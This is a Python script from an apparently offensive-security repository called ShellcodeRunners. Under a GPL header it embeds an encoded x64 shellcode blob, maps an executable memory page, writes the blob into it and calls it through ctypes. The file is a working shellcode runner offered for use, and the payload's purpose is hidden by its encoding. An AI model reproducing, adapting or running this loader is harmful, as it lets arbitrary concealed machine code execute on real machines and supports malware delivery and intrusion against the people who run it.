#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This repository implements multiples way to execute
#    shellcode with different platforms, systems and languages.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This repository implements multiples way to execute
shellcode with different platforms, systems and languages.
"""

__version__ = "0.2.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This repository implements multiples way to execute
shellcode with different platforms, systems and languages.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ShellcodeRunners"

copyright = """
ShellcodeRunners  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = []

print(copyright)

from ctypes import CFUNCTYPE, c_void_p, string_at
from mmap import mmap, PAGESIZE, MAP_SHARED, PROT_READ, PROT_WRITE, PROT_EXEC

shellcode = (
    b"\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05\xef"
    b"\xff\xff\xff\x48\xbb\xb0\x1d\x22\xf6\x8b\x86\xb8\xe6\x48"
    b"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xf8\xa5\x0d"
    b"\x94\xe2\xe8\x97\x95\xd8\x1d\xbb\xa6\xdf\xd9\xea\x80\xd8"
    b"\x30\x41\xa2\xd5\xd4\x50\xf7\xb0\x1d\x22\x93\xe8\xee\xd7"
    b"\xc6\xf8\x78\x4e\x9a\xe4\xa6\xef\x89\xc2\x71\x46\xf6\xdd"
    b"\xd1\xec\xb8\xda\x26\x7a\xf9\x8e\x86\xb8\xe6"
)
memory = mmap(
    -1,
    PAGESIZE,
    MAP_SHARED,
    PROT_READ | PROT_WRITE | PROT_EXEC,
)
memory.write(shellcode)
pointer = int.from_bytes(string_at(id(memory) + 16, 8), "little")
functype = CFUNCTYPE(c_void_p)
function = functype(pointer)
function()
